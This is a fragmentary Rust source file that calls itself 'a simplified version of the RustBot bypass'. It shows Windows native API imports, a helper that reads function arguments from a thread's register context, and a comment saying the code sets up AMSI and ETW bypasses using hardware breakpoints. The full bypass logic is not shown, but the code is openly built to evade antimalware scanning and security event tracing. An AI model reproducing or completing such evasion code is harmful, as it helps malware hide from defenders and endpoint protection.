...
//! This is a simplified version of the RustBot bypass.
...
use winapi::shared::{
    minwindef::ULONG,
    ntdef::{NTSTATUS, NT_SUCCESS, OBJECT_ATTRIBUTES},
    ntstatus::STATUS_SUCCESS,
};

use ntapi::{
    ntexapi::{SystemProcessInformation, SYSTEM_PROCESS_INFORMATION, SYSTEM_THREAD_INFORMATION},
...
fn get_arg(ctx: &CONTEXT, index: usize) -> usize {
    match index {
        ...
        2 => ctx.R8 as usize,
        3 => ctx.R9 as usize,
        _ => unsafe { *((ctx.Rsp as *const u64).add(index + 1) as *const usize) },
    }
}
...
/// Sets up AMSI and ETW bypass using hardware breakpoints
